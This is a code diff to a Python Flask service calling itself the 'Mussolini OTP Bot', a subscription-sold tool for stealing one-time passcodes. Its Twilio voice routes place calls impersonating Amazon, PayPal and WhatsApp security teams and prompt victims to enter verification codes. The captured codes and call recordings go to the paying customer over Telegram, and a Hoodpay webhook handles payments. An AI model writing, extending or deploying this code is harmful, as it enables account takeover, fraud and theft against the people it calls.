@@ -9,29 +9,13 @@ import json
 app = Flask('')
 
 # ==========================================
-# 📜 SCRIPTS POR DEFECTO (FALLBACK)
+# 📜 DEFAULT SCRIPTS
 # ==========================================
 DEFAULT_SCRIPTS = {
-    "amazon": (
-        "Hello. This is Amazon Security Department. "
-        "We detected a suspicious purchase on your account. "
-        "Please enter the verification code sent to your mobile device to cancel this order."
-    ),
-    "paypal": (
-        "Hello. This is PayPal Fraud Prevention. "
-        "A login attempt was made from a new device. "
-        "To block this sign-in, please enter the security code sent to your text messages."
-    ),
-    "whatsapp": (
-        "Hi. This is WhatsApp Support. "
-        "Someone is trying to register your number on a new device. "
-        "To prevent account theft, please enter the verification code displayed on your screen."
-    ),
-    "default": (
-        "Hello. This is an automated security call from {service}. "
-        "We detected unauthorized activity on your account. "
-        "Please enter the verification code sent to your mobile device to verify your identity."
-    )
+    "amazon": "Hello. This is Amazon Security. We detected a suspicious purchase. Please enter the verification code sent to your mobile device.",
+    "paypal": "Hello. This is PayPal Fraud Prevention. A login attempt was made from a new device. Enter your security code to block it.",
+    "whatsapp": "Hi. This is WhatsApp Support. Someone is trying to register your number. Enter the verification code on your screen.",
+    "default": "Hello. This is an automated security call from {service}. We detected unauthorized activity. Please enter the verification code sent to your mobile."
 }
 
 @app.route('/')
@@ -39,7 +23,7 @@ def home():
     return "Mussolini OTP Bot - Systems Online."
 
 # ==========================================
-# 1. WEBHOOK HOODPAY (PAGOS)
+# 1. HOODPAY WEBHOOK
 # ==========================================
 @app.route('/webhook/hoodpay', methods=['POST'])
 def hoodpay_webhook():
@@ -58,40 +42,31 @@ def hoodpay_webhook():
                 elif "monthly" in plan_type: days = 30
                 
                 success, new_date = add_subscription_days(user_id, days)
-                
                 if success:
                     try:
-                        bot.send_message(user_id, f"✅ **Payment Received!**\nPlan `{plan_type}` active until `{new_date}`.", parse_mode="Markdown")
-                        send_log(f"Pago Recibido: User {user_id} - Plan {plan_type}", level="PAYMENT")
+                        bot.send_message(user_id, f"✅ **Payment Received!**\nPlan `{plan_type}` active.", parse_mode="Markdown")
                     except: pass
-                
                 return jsonify({"status": "success"}), 200
         return jsonify({"status": "ignored"}), 200
-    except Exception as e:
-        log_error(e, "Hoodpay Webhook")
+    except Exception:
         return jsonify({"status": "error"}), 500
 
 # ==========================================
-# 2. WEBHOOK TWILIO - GENERADOR DE VOZ
+# 2. TWILIO VOICE ENGINE
 # ==========================================
 @app.route('/twilio/voice', methods=['POST'])
 def twilio_voice():
-    """Twilio pregunta: ¿Qué le digo a la víctima?"""
     service_raw = request.args.get('service', 'Security')
     user_id = request.args.get('user_id')
-    
     service_key = service_raw.lower()
     
-    # 1. BUSCAR SCRIPT PERSONALIZADO EN BASE DE DATOS
-    # Esto devuelve una tupla: (texto, idioma) ej: ("Hola soy Amazon", "es-MX")
+    # Check Custom Script
     custom_data = get_user_script(user_id, service_key)
     
     if custom_data:
-        # ✅ Usamos el script del usuario
         say_text = custom_data[0]
         language = custom_data[1]
     else:
-        # ⚠️ Usamos el default (Inglés)
         language = 'en-US'
         if service_key in DEFAULT_SCRIPTS:
             say_text = DEFAULT_SCRIPTS[service_key]
@@ -99,27 +74,20 @@ def twilio_voice():
             say_text = DEFAULT_SCRIPTS["default"].format(service=service_raw)
     
     resp = VoiceResponse()
-    
-    # Configurar Gather (Captura de teclas)
     gather = Gather(num_digits=8, action=f'/twilio/gather?user_id={user_id}&service={service_raw}', method='POST', timeout=10)
-    
-    # IMPORTANTE: Le pasamos el 'language' dinámico a Twilio para el acento
     gather.say(say_text, voice='alice', language=language)
-    
     resp.append(gather)
     resp.say("No input received. Goodbye.", voice='alice')
-    
     return Response(str(resp), mimetype='text/xml')
 
 # ==========================================
-# 3. WEBHOOK TWILIO - RESULTADO (CAPTURA)
+# 3. TWILIO OTP CAPTURE
 # ==========================================
 @app.route('/twilio/gather', methods=['POST'])
 def twilio_gather():
     digits = request.values.get('Digits')
     user_id = request.args.get('user_id')
     service = request.args.get('service')
-    
     resp = VoiceResponse()
 
     if digits and user_id:
@@ -127,13 +95,39 @@ def twilio_gather():
             bot.send_message(user_id, f"🎹 **OTP CAPTURED!**\n👤 Service: {service}\n🔢 Code: `{digits}`", parse_mode="Markdown")
             send_log(f"OTP Capturado para {user_id}: {digits}", level="SUCCESS")
         except: pass
-
-        # Despedida genérica
-        resp.say("Thank you. Your account is verified.", voice='alice')
+        resp.say("Thank you. Verified.", voice='alice')
     else:
         resp.say("Invalid input.", voice='alice')
 
     return Response(str(resp), mimetype='text/xml')
+
+# ==========================================
+# 4. TWILIO CALL STATUS (GRABACIONES)
+# ==========================================
+@app.route('/twilio/status', methods=['POST'])
+def twilio_status():
+    """
+    Recibe el estado final de la llamada y la URL de grabación.
+    """
+    user_id = request.args.get('user_id')
+    recording_url = request.values.get('RecordingUrl')
+    call_status = request.values.get('CallStatus')
+    
+    # Solo nos interesa si la llamada terminó y hay grabación
+    if user_id and recording_url and call_status == 'completed':
+        try:
+            # Añadimos .mp3 al final para que Telegram lo reconozca como audio
+            audio_link = f"{recording_url}.mp3"
+            
+            bot.send_message(
+                user_id, 
+                f"🎙️ **Call Recording Available**\n\nListen to the interaction:\n{audio_link}",
+                parse_mode="Markdown"
+            )
+        except Exception as e:
+            print(f"Error sending recording: {e}")
+
+    return Response("OK", mimetype='text/plain')
 
 def run():
     app.run(host='0.0.0.0', port=8080)
